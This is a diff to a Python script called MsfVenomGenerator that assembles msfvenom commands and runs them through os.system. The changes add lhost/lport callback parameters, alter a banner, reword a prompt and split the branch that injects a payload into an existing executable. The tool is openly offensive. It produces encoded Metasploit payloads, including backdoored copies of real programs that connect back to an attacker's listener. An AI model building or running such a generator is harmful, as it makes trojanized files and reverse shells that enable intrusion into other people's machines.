@@ -23,7 +23,7 @@ print("                                                                   \ \   
 print("                                                                    \ \ / /|  _| |  \| | | | | |\/| |")
 print("                                                                     \ V / | |___| |\  | |_| | |  | |")
 print("                                                                      \_/  |_____|_| \_|\___/|_|  |_|")
-print(bcolors.UNDERLINE + "                                                                                   ___________________________________________________________________________________________" + bcolors.ENDC)
+print(bcolors.UNDERLINE + "______________________________________________________________________________________________________________________________________________________________" + bcolors.ENDC)
 print(" ")
 print(" ")
 print(bcolors.OKBLUE + "MsfVenomGenerator by" + bcolors.WARNING + " DasPinguinHD")
@@ -163,7 +163,7 @@ try:
             x = "-k"
             print("Code-Injection into an existing file")
             print(" ")
-            print("Enter the path to the file, but don't enter the suffix of the file (like exe). Start from the root directory. ")
+            print("Enter the path to the file, but don't enter the suffix of the file (like exe). Start from the root directory '/' ")
             template = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
             print("Now enter the suffix of your file ")
             suffix = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
@@ -177,22 +177,25 @@ try:
     while True:
         if outcmd == "E":
             if file == "x":
-                msfcode = "msfvenom -p " + str(payload) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + " -o " + str(output1) + "." + str(output2)
+                msfcode = "msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + " -o " + str(output1) + "." + str(output2)
                 print("Executing... " + str(msfcode))
                 os.system(str(msfcode))
                 break
             if file == "o" or "k":
-                print("Executing... msfvenom -p " + str(payload) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
-                os.system("msfvenom -p " + str(payload) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
+                print("msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
+                os.system("msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
                 break
 
         elif outcmd == "s":
             try:
                 if file == "x":
-                    print("Your code: msfvenom -p " + str(payload) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + " -o " + str(output1) + "." + str(output2))
+                    print("Your code: msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + " -o " + str(output1) + "." + str(output2))
                     break
-                if file == "o" or "k":
-                    print(" Your code: msfvenom -p " + str(payload) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
+                if file == "o":
+                    print("msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
+                    break
+                if file == "k":
+                    print("msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport=" + str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
                     break
                 else:
                     print(bcolors.WARNING + "invalid input, try again." + bcolors.ENDC)
